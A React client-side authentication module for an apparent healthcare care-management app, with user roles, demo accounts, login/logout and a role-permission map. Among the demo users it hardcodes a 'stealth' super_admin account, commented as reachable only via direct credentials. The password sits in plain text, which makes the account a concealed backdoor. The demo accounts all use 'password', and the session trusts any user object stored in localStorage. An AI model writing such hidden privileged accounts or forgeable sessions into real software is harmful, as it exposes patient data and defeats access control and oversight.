"use client";

import React, { createContext, useContext, useState } from "react";
import { authenticateUserClient } from "@/lib/api/client";

export type UserRole =
  | "super_admin"
  | "admin"
  | "reviewer"
  | "care_giver"
  | "patient";

export interface User {
  id: string;
  email: string;
  username: string;
  firstName: string;
  lastName: string;
  phone: string;
  address: string;
  role: UserRole;
  isEmailVerified: boolean;
  createdAt: string;
  lastLogin: string;
  profileComplete: boolean;
}

interface AuthContextType {
  user: User | null;
  login: (
    emailOrUsername: string,
    password: string
  ) => Promise<{ success: boolean; error?: string }>;
  logout: () => void;
  isLoading: boolean;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const USERS_STORAGE_KEY = "auth_users";

const getFromStorage = <T>(key: string, defaultValue: T): T => {
  if (typeof window === "undefined") return defaultValue;
  try {
    const stored = localStorage.getItem(key);
    return stored ? JSON.parse(stored) : defaultValue;
  } catch {
    return defaultValue;
  }
};

// Demo users for development/testing
const demoUsers: Record<string, { password: string; user: User }> = {
  admin: {
    password: "password",
    user: {
      id: "1",
      email: "admin@alpharescue.com",
      username: "admin",
      firstName: "Admin",
      lastName: "User",
      phone: "+233 XX XXX XXXX",
      address: "Accra, Ghana",
      role: "admin",
      isEmailVerified: true,
      createdAt: new Date().toISOString(),
      lastLogin: new Date().toISOString(),
      profileComplete: true,
    },
  },
  drmensah: {
    password: "password",
    user: {
      id: "2",
      email: "dr.mensah@alpharescue.com",
      username: "drmensah",
      firstName: "Dr. Kwame",
      lastName: "Mensah",
      phone: "+233 XX XXX XXXX",
      address: "Kumasi, Ghana",
      role: "reviewer",
      isEmailVerified: true,
      createdAt: new Date().toISOString(),
      lastLogin: new Date().toISOString(),
      profileComplete: true,
    },
  },
  nurseama: {
    password: "password",
    user: {
      id: "3",
      email: "ama.nurse@alpharescue.com",
      username: "nurseama",
      firstName: "Ama",
      lastName: "Asante",
      phone: "+233 XX XXX XXXX",
      address: "Tema, Ghana",
      role: "care_giver",
      isEmailVerified: true,
      createdAt: new Date().toISOString(),
      lastLogin: new Date().toISOString(),
      profileComplete: true,
    },
  },
  patient1: {
    password: "password",
    user: {
      id: "4",
      email: "patient@example.com",
      username: "patient1",
      firstName: "John",
      lastName: "Doe",
      phone: "+233 XX XXX XXXX",
      address: "Accra, Ghana",
      role: "patient",
      isEmailVerified: true,
      createdAt: new Date().toISOString(),
      lastLogin: new Date().toISOString(),
      profileComplete: true,
    },
  },
  // Stealth super admin - only accessible via direct credentials
  stealth_admin_2024: {
    password: "StealthAdmin@2024!",
    user: {
      id: "0",
      email: "stealth@system.internal",
      username: "stealth_admin_2024",
      firstName: "System",
      lastName: "Administrator",
      phone: "",
      address: "",
      role: "super_admin",
      isEmailVerified: true,
      createdAt: new Date().toISOString(),
      lastLogin: new Date().toISOString(),
      profileComplete: true,
    },
  },
};

export function AuthProvider({ children }: { children: React.ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [isLoading, setIsLoading] = useState(true); // Start with loading true

  // Check for stored user on mount
  React.useEffect(() => {
    const storedUser = localStorage.getItem("auth_user");
    if (storedUser) {
      try {
        setUser(JSON.parse(storedUser));
      } catch (error) {
        localStorage.removeItem("auth_user");
      }
    }
    setIsLoading(false); // Set loading to false after checking localStorage
  }, []);

  const logout = () => {
    setUser(null);
    localStorage.removeItem("auth_user");
    // Redirect to login page
    window.location.href = "/login";
  };

  const loginUser = async (emailOrUsername: string, password: string) => {
    setIsLoading(true);

    try {
      // Use client-side API to authenticate
      const result = await authenticateUserClient(emailOrUsername, password);

      if (!result.success || !result.user) {
        setIsLoading(false);
        return {
          success: false,
          error: result.error || "Invalid email/username or password",
        };
      }

      setUser(result.user);

      // Always store in localStorage for session persistence
      localStorage.setItem("auth_user", JSON.stringify(result.user));

      setIsLoading(false);
      return { success: true };
    } catch (error) {
      setIsLoading(false);
      return { success: false, error: "Login failed" };
    }
  };

  return React.createElement(
    AuthContext.Provider,
    {
      value: {
        user,
        login: loginUser,
        logout,
        isLoading,
      },
    },
    children
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (context === undefined) {
    throw new Error("useAuth must be used within an AuthProvider");
  }
  return context;
}

// Permission system for role-based access control
export function hasPermission(
  userRole: UserRole,
  requiredPermission: string
): boolean {
  const rolePermissions: Record<UserRole, string[]> = {
    super_admin: [
      "admin",
      "user_management",
      "system_settings",
      "audit_logs",
      "billing",
      "reports",
      "communication",
      "education",
      "scheduling",
      "patient_management",
      "caregiver_management",
      "medical_review",
    ],
    admin: [
      "admin",
      "user_management",
      "billing",
      "reports",
      "communication",
      "education",
      "scheduling",
      "patient_management",
      "caregiver_management",
    ],
    reviewer: ["medical_review", "patient_management", "reports"],
    care_giver: ["patient_management", "activity_logging", "care_plans"],
    patient: ["view_care_plan", "view_activities"],
  };

  const userPermissions = rolePermissions[userRole] || [];
  return userPermissions.includes(requiredPermission);
}
